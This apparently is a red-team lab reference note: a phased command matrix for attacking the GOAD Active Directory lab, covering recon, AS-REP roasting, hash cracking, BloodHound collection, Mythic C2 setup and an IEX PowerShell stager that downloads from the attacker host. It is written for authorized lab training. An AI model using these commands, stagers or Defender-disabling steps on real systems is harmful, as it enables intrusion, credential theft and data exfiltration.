---
title: GOAD - Command Execution Matrix
category: Reference
environment: GOAD
tags:
  - GOAD
  - Reference
  - Commands
  - ExecutionContext
  - OperationCypherKnife
date_created: 2026-08-23
date_updated: 2026-08-23
status: MAINTAINED
---

# GOAD — Command Execution Matrix

> [!WARNING]
> **Authorized GOAD lab only.** Network: `192.168.56.0/24` (VirtualBox host-only). Do not use against systems outside this lab.

> [!IMPORTANT]
> This note is the **authoritative execution map** for Operation Cypher-Knife and all GOAD lab work.
> Read [[GOAD - Error Audit and Contradiction Report]] before executing any procedure.
> Complete [[GOAD - Final Validation Checklist]] before active exploitation.

> [!NOTE]
> Mythic task commands (`shell`, `powershell`, `execute-assembly`, `upload`, `download`, `socks`, `steal_token`, `screenshot`) are issued from the **Mythic UI** to an active Apollo callback — **not** from a Kali terminal.

---

## Execution Context Legend

| Label | Host | Shell / Interface |
|---|---|---|
| `[KALI]` | Kali attacker VM | Bash |
| `[KALI-UI]` | Kali attacker VM | Browser (Mythic UI, BloodHound UI) |
| `[HOST]` | GOAD host machine (where Vagrant runs) | Bash |
| `[MYTHIC]` | Mythic UI → active Windows callback | Mythic task interface |
| `[VICTIM-CMD]` | GOAD Windows victim | CMD (Mythic `shell` task) |
| `[VICTIM-PS]` | GOAD Windows victim | PowerShell (Mythic `powershell` task or direct PS on VM) |

---

## Documented IP / Hostname Reference

> [!CAUTION] IP Conflict
> Conflicting IP information exists in the vault (see [[GOAD - Error Audit and Contradiction Report]] ERROR 01).
> Old notes (`192.168.56.0 24…`, GOAD Assault Playbook) use functional hostnames and different topology.
> **Verify against the running GOAD environment before execution.** Do not silently trust any single source.

| Host | Documented IP | Documented FQDN | Status |
|---|---|---|---|
| King's Landing | `192.168.56.10` | `kingslanding.sevenkingdoms.local` | Documented — verify live |
| Winterfell | `192.168.56.11` | `winterfell.north.sevenkingdoms.local` | Documented — verify live |
| Meereen | `192.168.56.12` | `meereen.essos.local` | Documented — verify live |
| Castle Black | `192.168.56.22` | `castelblack.north.sevenkingdoms.local` | Documented — verify live |
| Braavos | `192.168.56.23` | `braavos.essos.local` | Documented — verify live |
| Kali (attacker) | `192.168.56.1` | N/A | Documented on `vmnet7` — verify live |

Full matrix: [[GOAD - IP Hostname Matrix]]

**Domains (documented):** `sevenkingdoms.local`, `north.sevenkingdoms.local`, `essos.local`

**Post-compromise workflow map:** [[GOAD - Active Directory - Inside the Domain Workflow]]

---

## How to Read Command Entries

Each entry uses the standard fields below. Sensitive values use placeholders: `<LAB_USER>`, `<LAB_DOMAIN>`, `<LAB_HOST>`, `<REDACTED>`.

| Field | Required |
|---|---|
| Phase | Yes |
| Objective | Yes |
| Execution Context | Yes |
| Host | Yes |
| Shell | Yes |
| Privileges | Yes |
| Target | Yes |
| Prerequisites | Yes |
| Command/Action | Yes |
| Expected Result | Yes |
| Validation | Yes |
| Troubleshooting | Yes |
| Cleanup | When applicable |
| Related Note | Yes |

---

# Phase 0 — Environment Validation

**Purpose:** Confirm lab infrastructure, network, DNS, tools, and binaries before reconnaissance or exploitation.

**Evidence to capture:** Kali IP/interface, nmap sweep output, `getent hosts` results, tool versions, Mythic container status, validation checklist sign-off.

---

### P0-001 — Verify GOAD VMs running

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm GOAD VMs are powered on |
| **Execution Context** | `[HOST]` |
| **Host** | Host machine (GOAD/Vagrant directory — not Kali) |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | GOAD Vagrant VMs |
| **Prerequisites** | GOAD cloned; Vagrant + VirtualBox installed |
| **Command/Action** | `cd /path/to/GOAD && vagrant status` |
| **Expected Result** | Five VMs show `running (virtualbox)` |
| **Validation** | All expected VMs listed as running |
| **Troubleshooting** | If stopped: `vagrant up` from GOAD directory |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Environment Setup and Validation]] |

---

### P0-002 — Identify Kali IP on GOAD network

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Record Kali IP for C2 callbacks and delivery |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Local network interfaces |
| **Prerequisites** | Kali attached to host-only adapter |
| **Command/Action** | `ip addr show` then `ip addr show \| grep "192.168.56"` |
| **Expected Result** | One interface with `192.168.56.x` (documented: `192.168.56.1` on `vmnet7`) |
| **Validation** | IP recorded; used in payload `callback_host` |
| **Troubleshooting** | No 192.168.56.x → check VirtualBox adapter attachment |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Payload Generation]], [[GOAD - IP Hostname Matrix]] |

---

### P0-003 — Network discovery sweep

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Discover live hosts on lab subnet |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root (`sudo`) |
| **Target** | `192.168.56.0/24` |
| **Prerequisites** | P0-001; GOAD VMs running |
| **Command/Action** | `sudo nmap -sn 192.168.56.0/24` |
| **Expected Result** | 5–6 live hosts (GOAD VMs + Kali) |
| **Validation** | `.10`, `.11`, `.12`, `.22`, `.23` respond; compare [[GOAD - IP Hostname Matrix]] |
| **Troubleshooting** | Fewer hosts → `vagrant status`; check host-only adapter |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Environment Setup and Validation]] |

---

### P0-004 — Verify routing to lab subnet

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm Kali has route to GOAD network |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Local routing table |
| **Prerequisites** | P0-002 |
| **Command/Action** | `ip route show \| grep "192.168.56"` |
| **Expected Result** | Route: `192.168.56.0/24 dev <interface>` |
| **Validation** | Route present for lab subnet |
| **Troubleshooting** | Missing route → reattach VM to host-only network |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Environment Setup and Validation]] |

---

### P0-005 — Backup and configure `/etc/hosts`

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Enable static hostname resolution for GOAD hosts on Kali |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root (`sudo`) |
| **Target** | `/etc/hosts` on Kali only |
| **Prerequisites** | P0-003 confirms documented IPs |
| **Command/Action** | `sudo cp /etc/hosts /etc/hosts.backup.$(date +%Y%m%d_%H%M%S)` then edit per [[GOAD - Network Configuration and hosts Procedure]] |
| **Expected Result** | GOAD block added with verified IPs |
| **Validation** | `grep -A 10 "GOAD" /etc/hosts`; no tab characters |
| **Troubleshooting** | See [[GOAD - Network Configuration and hosts Procedure]] Step 7 |
| **Cleanup** | `sudo cp /etc/hosts.backup.<timestamp> /etc/hosts` to rollback |
| **Related Note** | [[GOAD - Network Configuration and hosts Procedure]] |

---

### P0-006 — Validate DNS/hosts resolution

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm hostnames resolve to documented IPs |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | All GOAD FQDNs |
| **Prerequisites** | P0-005 complete |
| **Command/Action** | `getent hosts kingslanding.sevenkingdoms.local` (repeat for winterfell, meereen, castelblack, braavos) |
| **Expected Result** | Each returns documented IP |
| **Validation** | IP matches [[GOAD - IP Hostname Matrix]] |
| **Troubleshooting** | Check `grep hosts /etc/nsswitch.conf` → `hosts: files dns` |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Network Configuration and hosts Procedure]] |

---

### P0-007 — ICMP reachability check

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm network connectivity (not just DNS) |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `192.168.56.10`–`.23` (GOAD hosts) |
| **Prerequisites** | P0-003, P0-006 |
| **Command/Action** | `ping -c 2 192.168.56.10` (repeat for `.11`, `.12`, `.22`, `.23`) |
| **Expected Result** | Replies from Windows hosts (TTL ~128) |
| **Validation** | All five GOAD hosts respond |
| **Troubleshooting** | DNS resolves but ping fails → VM down or firewall; ping IP not hostname first |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Environment Setup and Validation]] |

---

### P0-008 — Quick SMB / DC service check

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm key AD services reachable |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | DCs: `.10`, `.11`, `.12`; members: `.22`, `.23` |
| **Prerequisites** | P0-007 |
| **Command/Action** | `nmap -p 88,389,445,3389 192.168.56.10` (repeat per host); `smbclient -L //192.168.56.10 -N 2>&1 \| head -20` |
| **Expected Result** | Port 445 open on all; port 88 on DCs; SMB share list returned |
| **Validation** | Kerberos/LDAP/SMB reachable on DCs |
| **Troubleshooting** | Port closed → service stopped or firewall |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Environment Setup and Validation]] |

---

### P0-009 — Verify required Kali tools

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Confirm enumeration/post-exploit tooling installed |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Local tool installation |
| **Prerequisites** | None |
| **Command/Action** | `which nmap smbclient crackmapexec impacket-GetNPUsers hashcat bloodhound neo4j` |
| **Expected Result** | All tools found in PATH |
| **Validation** | [[GOAD - Final Validation Checklist]] Section F |
| **Troubleshooting** | Missing tool → `sudo apt install` per Kali package names |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Final Validation Checklist]] |

---

### P0-010 — Install and verify Mythic infrastructure

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Stand up Mythic C2 on Kali |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root (`sudo`) |
| **Target** | Mythic Docker stack |
| **Prerequisites** | Internet access; Docker available |
| **Command/Action** | `git clone https://github.com/its-a-feature/Mythic.git && cd Mythic && sudo ./install_docker_ubuntu.sh && sudo ./mythic-cli start && sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo && sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http && sudo ./mythic-cli restart && sudo docker ps` |
| **Expected Result** | All Mythic containers `Up` / `healthy`; Apollo + HTTP profile installed |
| **Validation** | UI at `https://127.0.0.1:7443`; Payloads → Create shows `apollo`; C2 profile `http` visible |
| **Troubleshooting** | `sudo ./mythic-cli logs mythic_server`; see [[Mythic - Installation and Verification]] |
| **Cleanup** | `sudo ./mythic-cli stop` when lab session ends (optional) |
| **Related Note** | [[Mythic - Installation and Verification]] |

---

### P0-011 — Download and upload lab binaries

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Stage Mythic File Host binaries for in-memory ops |
| **Execution Context** | `[KALI]` + `[KALI-UI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash; Mythic UI for upload |
| **Privileges** | User (Bash); Mythic operator (UI) |
| **Target** | `~/payloads/goad/` → Mythic File Host |
| **Prerequisites** | P0-010 |
| **Command/Action** | Download GodPotato, Mimikatz, SharpHound, Rubeus, Seatbelt, SharpUp per [[Mythic - Installation and Verification]] Step 7; upload each via Mythic UI → Payloads → File Host |
| **Expected Result** | Binaries on disk and in Mythic File Host |
| **Validation** | [[GOAD - Final Validation Checklist]] Section G |
| **Troubleshooting** | `execute-assembly` fails → binary not on File Host |
| **Cleanup** | N/A (binaries persist for lab use) |
| **Related Note** | [[Mythic - Installation and Verification]] |

---

### P0-012 — Pre-exploitation sign-off

| Field | Value |
|---|---|
| **Phase** | 0 |
| **Objective** | Formal go/no-go before active exploitation |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Documentation |
| **Privileges** | N/A |
| **Target** | Operator checklist |
| **Prerequisites** | P0-001 through P0-011 |
| **Command/Action** | Complete [[GOAD - Final Validation Checklist]] Sections A–P and Pre-Exploitation Sign-Off block |
| **Expected Result** | All applicable boxes checked; sign-off recorded |
| **Validation** | Error Audit read; no unresolved IP conflicts without VERIFY note |
| **Troubleshooting** | Any FAIL item → resolve before Phase 1 |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Final Validation Checklist]], [[Operation Cypher-Knife - Scope]] |

---

# Phase 1 — Initial Reconnaissance

**Purpose:** Unauthenticated/low-privilege discovery from Kali before agent deployment.

**Evidence to capture:** nmap output, CME sweep, SMB share listings, username lists, hash files.

Detail: [[GOAD - Enumeration - Initial Recon]]

---

### P1-001 — Live host discovery

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | Map live hosts on lab subnet |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root (`sudo`) |
| **Target** | `192.168.56.0/24` |
| **Prerequisites** | Phase 0 complete |
| **Command/Action** | `sudo nmap -sn 192.168.56.0/24` |
| **Expected Result** | Five GOAD VMs + Kali visible |
| **Validation** | Compare with [[GOAD - IP Hostname Matrix]] |
| **Troubleshooting** | Missing host → Phase 0 P0-001 |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P1-002 — DC port scan (service identification)

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | Identify AD services on domain controllers |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `192.168.56.10`, `.11`, `.12` |
| **Prerequisites** | P1-001 |
| **Command/Action** | `nmap -sV -p 88,389,445,636,3268,3269,3389,5985 192.168.56.10` (repeat `.11`, `.12`) |
| **Expected Result** | 88/389/445 open on DCs; WinRM 5985 may be open |
| **Validation** | Port 88 confirms Kerberos/DC role |
| **Troubleshooting** | `-sV` slow → drop to `-sT` without version |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P1-003 — Member server port scan

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | Identify services on member servers |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `192.168.56.22`, `192.168.56.23` |
| **Prerequisites** | P1-001 |
| **Command/Action** | `nmap -sV -p 445,3389,80,443,8080,5985 192.168.56.22` (repeat `.23`) |
| **Expected Result** | SMB 445 open; web ports may be open on IIS hosts |
| **Validation** | Record open ports in findings template |
| **Troubleshooting** | No web ports → host may not run IIS |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P1-004 — SMB null session enumeration

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | List shares without credentials |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | All GOAD hosts (`.10`–`.12`, `.22`, `.23`) |
| **Prerequisites** | P1-001 |
| **Command/Action** | `smbclient -L //192.168.56.10 -N` (repeat per host) |
| **Expected Result** | Share list returned; some GOAD shares may allow guest/null |
| **Validation** | Note accessible shares per host |
| **Troubleshooting** | `NT_STATUS_ACCESS_DENIED` → null session blocked on that host |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P1-005 — Guest share file retrieval

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | Download accessible share content for credential discovery |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `<LAB_HOST>` with accessible Share (documented: `192.168.56.22`) |
| **Prerequisites** | P1-004 shows accessible share |
| **Command/Action** | `smbget -R smb://192.168.56.22/Share -U guest%` then `grep -ri "password\|credential\|Pass" ./Share/ 2>/dev/null` |
| **Expected Result** | Files downloaded; possible cleartext credentials in files |
| **Validation** | Record any `<LAB_USER>` / password findings to [[Operation Cypher-Knife - Findings]] |
| **Troubleshooting** | Empty share → try other hosts from P1-004 |
| **Cleanup** | Remove downloaded `./Share/` directory when evidence captured |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P1-006 — CrackMapExec SMB sweep

| Field | Value |
|---|---|
| **Phase** | 1 |
| **Objective** | Enumerate OS, signing, and SMB auth status |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `192.168.56.0/24` |
| **Prerequisites** | P1-001 |
| **Command/Action** | `crackmapexec smb 192.168.56.0/24` |
| **Expected Result** | Hostnames, Windows versions, SMB signing status per host |
| **Validation** | Record `signing: True/False` per host |
| **Troubleshooting** | No output → check connectivity Phase 0 |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

# Phase 2 — Active Directory Enumeration

**Purpose:** Deeper AD discovery — LDAP, Kerberos, users, trusts, BloodHound.

> [!IMPORTANT] Execution Order Exception
> **P2-001 through P2-005** run from Kali before initial access (Phase 3).
> **P2-006 through P2-009** require an active Apollo callback — execute **after P3-005**, not immediately after P2-005.
> **P2-010** is blocked pending [[GOAD - Active Directory - Kerberoasting]] (TODO).

---

### P2-001 — Anonymous LDAP bind test

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Test unauthenticated LDAP enumeration |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `192.168.56.10` (sevenkingdoms.local DC) |
| **Prerequisites** | Phase 1 complete |
| **Command/Action** | `ldapsearch -H ldap://192.168.56.10 -x -b "" -s base namingContexts` |
| **Expected Result** | namingContexts returned if anonymous bind allowed; may fail (record result) |
| **Validation** | Document allow/deny per DC |
| **Troubleshooting** | Bind failed → expected on hardened DC; continue with Kerberos enum |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P2-002 — LDAP user enumeration (if anonymous allowed)

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Enumerate AD objects via LDAP |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `DC=sevenkingdoms,DC=local` on `192.168.56.10` |
| **Prerequisites** | P2-001 succeeds |
| **Command/Action** | `ldapsearch -H ldap://192.168.56.10 -x -b "DC=sevenkingdoms,DC=local" "(objectClass=*)" cn sAMAccountName` |
| **Expected Result** | User/computer objects listed |
| **Validation** | sAMAccountName values recorded |
| **Troubleshooting** | Size limit → add filter `(objectClass=user)` |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P2-003 — Kerbrute username enumeration

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Discover valid AD usernames via Kerberos |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `<LAB_DOMAIN>` DC at `192.168.56.10` |
| **Prerequisites** | kerbrute installed; domain name verified |
| **Command/Action** | `./kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local <wordlist>`; test known GOAD users (Administrator, vagrant, arya.stark, hodor, etc.) |
| **Expected Result** | Valid usernames identified |
| **Validation** | Save list to `known_users.txt` |
| **Troubleshooting** | KDC unreachable → verify port 88 on DC |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P2-004 — AS-REP roasting (no preauth)

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Obtain crackable Kerberos hashes for accounts without preauth |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `<LAB_DOMAIN>` / DC `192.168.56.10` |
| **Prerequisites** | P2-003 username list |
| **Command/Action** | `impacket-GetNPUsers sevenkingdoms.local/ -dc-ip 192.168.56.10 -usersfile known_users.txt -no-pass -format hashcat` |
| **Expected Result** | `$krb5asrep$` hashes for vulnerable accounts (GOAD may include hodor, arya.stark) |
| **Validation** | Hashes saved to file; crack with P2-005 |
| **Troubleshooting** | No hashes → expand username list; verify domain name |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P2-005 — Crack AS-REP / Kerberos hashes

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Recover plaintext passwords from captured hashes |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Local hash files |
| **Prerequisites** | P2-004 or later Kerberos hash capture |
| **Command/Action** | `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt` (Kerberos TGS: `-m 13100`) |
| **Expected Result** | Cracked `<LAB_USER>:<REDACTED>` entries |
| **Validation** | Test creds via CME or initial access path |
| **Troubleshooting** | No crack → try rules; expand wordlist |
| **Cleanup** | Store cracked creds in [[Operation Cypher-Knife - Findings]] only — not in this matrix |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]] |

---

### P2-006 — Domain / trust enumeration (via callback)

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Enumerate trusts and Domain Admins from domain context |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-CMD]` |
| **Host** | Active GOAD Windows callback |
| **Shell** | CMD (Mythic `shell` task) |
| **Privileges** | Domain User (minimum) |
| **Target** | Local AD from callback host |
| **Prerequisites** | **P3-005 complete** (active Apollo callback required) |
| **Command/Action** | `shell nltest /domain_trusts`; `shell net group "Domain Admins" /domain`; `shell net user %USERNAME% /domain` |
| **Expected Result** | Trust list; DA membership; current user domain info |
| **Validation** | Domains match documented topology |
| **Troubleshooting** | Access denied → insufficient privilege; record partial output |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Active Directory - BloodHound Collection]], [[GOAD - Final Validation Checklist]] Section I |

---

### P2-007 — BloodHound collection (SharpHound)

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Collect AD graph data for attack path analysis |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-CMD]` |
| **Host** | Active GOAD Windows callback |
| **Shell** | CMD (`execute-assembly` task) |
| **Privileges** | Domain User (minimum); DA for fullest collection |
| **Target** | `sevenkingdoms.local`, `north.sevenkingdoms.local`, `essos.local` |
| **Prerequisites** | **P3-005 complete**; SharpHound on Mythic File Host |
| **Command/Action** | `execute-assembly SharpHound.exe -c All -d sevenkingdoms.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix goad_seven` (repeat for north, essos domains) |
| **Expected Result** | `goad_*.zip` in `C:\Windows\Temp` |
| **Validation** | `shell dir C:\Windows\Temp\goad_*.zip` |
| **Troubleshooting** | .NET error → check .NET version on victim; try without `-d` for auto-detect |
| **Cleanup** | P2-008 download then P2-009 delete zips on victim |
| **Related Note** | [[GOAD - Active Directory - BloodHound Collection]] |

---

### P2-008 — Download BloodHound archives

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Exfiltrate SharpHound output to Kali |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active GOAD Windows callback |
| **Shell** | Mythic `download` task |
| **Privileges** | Current callback user |
| **Target** | `C:\Windows\Temp\goad_*.zip` |
| **Prerequisites** | **P3-005 complete**; P2-007 complete |
| **Command/Action** | `download C:\Windows\Temp\goad_seven_*.zip` (repeat north, essos) |
| **Expected Result** | Files in Mythic UI → Callbacks → Files → Downloads |
| **Validation** | Zip files present on Mythic server |
| **Troubleshooting** | Empty download → SharpHound still running; wait and retry |
| **Cleanup** | P2-009 |
| **Related Note** | [[GOAD - Active Directory - BloodHound Collection]] |

---

### P2-009 — BloodHound analysis on Kali

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Import and analyze AD attack paths |
| **Execution Context** | `[KALI]` + `[KALI-UI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash; BloodHound GUI |
| **Privileges** | root for neo4j start; User for BloodHound |
| **Target** | Downloaded SharpHound zips |
| **Prerequisites** | P2-008 |
| **Command/Action** | `sudo neo4j start`; `sleep 15`; `bloodhound --no-sandbox`; import zips; run queries (Shortest Path to DA, Kerberoastable, AS-REP Roastable, DCSync privileges) |
| **Expected Result** | Graph populated; attack paths visible |
| **Validation** | Record paths in [[Operation Cypher-Knife - Findings]] |
| **Troubleshooting** | No data → `sudo neo4j status`; re-import |
| **Cleanup** | `sudo neo4j stop` when analysis complete (optional) |
| **Related Note** | [[GOAD - Active Directory - BloodHound Collection]] |

---

### P2-010 — Kerberoasting

| Field | Value |
|---|---|
| **Phase** | 2 |
| **Objective** | Obtain Kerberos TGS hashes for crackable service accounts |
| **Execution Context** | VERIFY |
| **Host** | VERIFY |
| **Shell** | VERIFY |
| **Privileges** | VERIFY |
| **Target** | VERIFY |
| **Prerequisites** | Rubeus on Mythic File Host (P0-011); valid domain creds or callback |
| **Command/Action** | **TODO — Note does not currently exist:** [[GOAD - Active Directory - Kerberoasting]] |
| **Expected Result** | BloodHound query "Find Kerberoastable Users" identifies candidates; procedure not yet documented in vault |
| **Validation** | N/A until note created |
| **Troubleshooting** | Use BloodHound kerberoastable query for enumeration only |
| **Cleanup** | N/A |
| **Related Note** | TODO — [[GOAD - Active Directory - Kerberoasting]] |

---

# Phase 3 — Initial Access / Lab Entry

**Purpose:** Obtain first Apollo callback on a GOAD Windows host using documented lab procedures only.

> [!NOTE]
> **TODO — Note does not currently exist:** [[GOAD - Exploitation - Initial Access Vectors]] — expanded delivery paths not yet written. Procedures below sourced from [[Mythic - Payload Generation]] and [[GOAD - Enumeration - Initial Recon]].

---

### P3-001 — Generate Apollo payload

| Field | Value |
|---|---|
| **Phase** | 3 |
| **Objective** | Create C2 stager with correct callback IP |
| **Execution Context** | `[KALI-UI]` |
| **Host** | Kali — Mythic Web UI (`https://127.0.0.1:7443`) |
| **Shell** | Mythic UI |
| **Privileges** | Mythic operator |
| **Target** | Apollo payload configuration |
| **Prerequisites** | P0-010, P0-011; Kali IP verified (P0-002) |
| **Command/Action** | Payloads → Create: Type `apollo`, C2 `http`, `callback_host` = `http://<KALI_IP>` (documented: `http://192.168.56.1`), `callback_port` = `80`, interval `10`, jitter `0.30` |
| **Expected Result** | Payload compiles; download available |
| **Validation** | No placeholder `mythic-server` in config |
| **Troubleshooting** | See [[Mythic - Payload Generation]] |
| **Cleanup** | Regenerate if wrong IP |
| **Related Note** | [[Mythic - Payload Generation]] |

---

### P3-002 — Start HTTP stager server

| Field | Value |
|---|---|
| **Phase** | 3 |
| **Objective** | Serve stager to GOAD victim |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root (port 80) |
| **Target** | `~/payloads/goad/` web root |
| **Prerequisites** | P3-001; stager in payload directory |
| **Command/Action** | `cd ~/payloads/goad && sudo python3 -m http.server 80` |
| **Expected Result** | `Serving HTTP on 0.0.0.0 port 80` |
| **Validation** | From Kali: `curl http://127.0.0.1/stager.ps1` returns content (if PS stager) |
| **Troubleshooting** | Port in use → `sudo ss -tlnp \| grep :80`; use alt port + regenerate payload |
| **Cleanup** | Ctrl+C server when session complete |
| **Related Note** | [[Mythic - Payload Generation]] |

---

### P3-003 — Deliver PowerShell stager (lab entry)

| Field | Value |
|---|---|
| **Phase** | 3 |
| **Objective** | Execute stager on GOAD Windows host |
| **Execution Context** | `[VICTIM-PS]` |
| **Host** | `<LAB_HOST>` (GOAD Windows VM) |
| **Shell** | PowerShell |
| **Privileges** | User (context depends on access vector) |
| **Target** | Local GOAD Windows host |
| **Prerequisites** | P3-002 running; shell access or execution path on victim |
| **Command/Action** | `powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/stager.ps1')"` |
| **Expected Result** | Stager executes; callback within ~10–20s |
| **Validation** | Mythic UI → Callbacks shows new agent |
| **Troubleshooting** | No callback → wrong IP, Defender, firewall, server not running; Windows Defender on GOAD VMs may block stager — disable before delivery (see [[Mythic - Payload Generation]]) |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Payload Generation]] |

---

### P3-004 — Initial access via cracked AS-REP credentials

| Field | Value |
|---|---|
| **Phase** | 3 |
| **Objective** | Use recovered creds to gain execution on GOAD host |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `<LAB_HOST>` with exposed WinRM/SMB/RDP |
| **Prerequisites** | P2-005 cracked credentials |
| **Command/Action** | Validate: `crackmapexec smb 192.168.56.0/24 -u <LAB_USER> -p '<REDACTED>'`; use valid session to reach execution context for P3-003 |
| **Expected Result** | `(P+)` on `<LAB_HOST>` confirms valid creds |
| **Validation** | CME shows admin or user access |
| **Troubleshooting** | `(P-)` → wrong password or user not on host |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Enumeration - Initial Recon]]; TODO — [[GOAD - Exploitation - Initial Access Vectors]] |

---

### P3-005 — Confirm first callback context

| Field | Value |
|---|---|
| **Phase** | 3 |
| **Objective** | Document initial access vector and host context |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-CMD]` |
| **Host** | First Apollo callback |
| **Shell** | CMD (`shell` task) |
| **Privileges** | Current user |
| **Target** | Callback host |
| **Prerequisites** | P3-003 or P3-004 |
| **Command/Action** | `shell whoami`; `shell hostname`; `shell ipconfig` |
| **Expected Result** | Username, GOAD hostname, `192.168.56.x` IP |
| **Validation** | Matches [[GOAD - IP Hostname Matrix]]; record in [[Operation Cypher-Knife - Findings]] |
| **Troubleshooting** | Unexpected hostname → re-verify topology |
